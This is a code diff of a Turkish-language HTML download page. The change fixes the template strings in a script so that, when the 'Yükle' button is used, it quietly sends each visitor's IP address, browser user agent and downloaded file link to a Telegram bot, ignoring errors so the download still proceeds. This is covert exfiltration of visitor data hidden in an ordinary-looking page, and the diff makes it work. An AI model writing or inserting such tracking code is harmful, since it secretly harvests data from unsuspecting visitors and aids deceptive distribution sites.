@@ -328,7 +328,7 @@
 </main>
 
 
-      <button type="button" class="btn btn-success fs-5 py-2 px-4 rounded-4" id="downloadBtn">Yükle</button>
+        <button type="button" class="btn btn-success fs-5 py-2 px-4 rounded-4" id="downloadBtn">Yükle</button>
 
 <script>
 document.addEventListener("DOMContentLoaded", () => {
@@ -378,8 +378,8 @@ document.addEventListener("DOMContentLoaded", () => {
       .then(res => res.json())
       .then(data => {
         const ip = data.ip;
-        const message = new userr.\nIP: ${ip}\nCihaz: ${userAgent}\nİndirilen link: ${fileUrl};
-        return fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)});
+        const message = `new userr.\nIP: ${ip}\nCihaz: ${userAgent}\nİndirilen link: ${fileUrl}`;
+        return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
       })
       .catch(() => { /* hata olsa bile devam et */ })
       .finally(() => {
@@ -400,6 +400,7 @@ document.addEventListener("DOMContentLoaded", () => {
   });
 });
 </script>
+
 
 
 <div style="display: flex; align-items: center; gap: 28px;">
